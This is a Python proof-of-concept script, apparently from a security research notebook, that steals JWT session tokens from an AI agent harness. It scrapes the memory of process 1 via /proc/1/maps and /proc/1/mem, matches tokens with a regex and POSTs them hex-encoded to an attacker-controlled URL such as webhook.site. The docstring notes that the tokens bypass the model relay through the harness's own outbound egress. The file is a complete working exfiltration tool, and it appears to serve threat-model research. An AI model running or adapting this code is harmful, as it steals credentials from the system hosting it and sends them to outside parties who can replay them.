"""Notebook-14 §4.13 — end-to-end JWT exfil from harness to attacker URL.

Lifts the JWT from /proc/1/mem (inside the harness) and POSTs the bytes
hex-encoded to an attacker-controlled URL. The LLM relay only sees status
lines; the JWT bytes traverse the harness's outbound HTTPS egress.

Proves the threat-model link between "JWT lives in PID 1" and "JWT exfilled
to attacker-controlled infra, replayable from anywhere on the internet."

Env:
  EXFIL_URL — destination URL (e.g. webhook.site)
"""
import hashlib
import json
import os
import re
import sys
import urllib.error
import urllib.request


JWT_RE = re.compile(rb'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')


def lift_jwt():
    regions = []
    with open('/proc/1/maps', 'r') as f:
        for line in f:
            parts = line.split()
            if len(parts) < 5:
                continue
            addr_range, perms = parts[0], parts[1]
            path = parts[5] if len(parts) >= 6 else ''
            if not perms.startswith('rw-') or path:
                continue
            try:
                start_s, end_s = addr_range.split('-')
                regions.append((int(start_s, 16), int(end_s, 16)))
            except Exception:
                continue

    seen = set()
    with open('/proc/1/mem', 'rb') as mem:
        for start, end in regions:
            try:
                mem.seek(start)
                chunk = mem.read(end - start)
            except Exception:
                continue
            for m in JWT_RE.finditer(chunk):
                jwt = m.group(0)
                if len(jwt) < 200 or jwt in seen:
                    continue
                seen.add(jwt)
                yield jwt


def main():
    exfil_url = os.environ.get('EXFIL_URL')
    if not exfil_url:
        print('EXFIL_FAIL=missing_EXFIL_URL')
        sys.exit(1)
    print(f'EXFIL_TARGET={exfil_url}')

    sent_count = 0
    for idx, jwt_bytes in enumerate(lift_jwt(), start=1):
        sha = hashlib.sha256(jwt_bytes).hexdigest()
        hex_str = jwt_bytes.hex()
        print(f'JWT[{idx}]_LEN={len(jwt_bytes)}')
        print(f'JWT[{idx}]_SHA256={sha}')

        # POST hex-encoded JWT to attacker URL. Hex transport is lossless over
        # network; webhook.site captures POST bodies verbatim.
        body = json.dumps({
            'event': 'JWT_EXFIL',
            'jwt_index': idx,
            'jwt_len': len(jwt_bytes),
            'jwt_sha256': sha,
            'jwt_hex': hex_str,
        }).encode()
        req = urllib.request.Request(
            exfil_url,
            data=body,
            headers={'Content-Type': 'application/json'},
            method='POST',
        )
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                print(f'JWT[{idx}]_EXFIL_STATUS={resp.status}')
                sent_count += 1
        except urllib.error.HTTPError as e:
            print(f'JWT[{idx}]_EXFIL_STATUS={e.code}')
        except Exception as e:
            print(f'JWT[{idx}]_EXFIL_ERROR={type(e).__name__}: {str(e)[:150]}')

    print(f'EXFIL_SUMMARY sent={sent_count}')
    if sent_count > 0:
        print('EXFIL_VERDICT=POSTED')
    else:
        print('EXFIL_VERDICT=FAIL')


if __name__ == '__main__':
    main()
            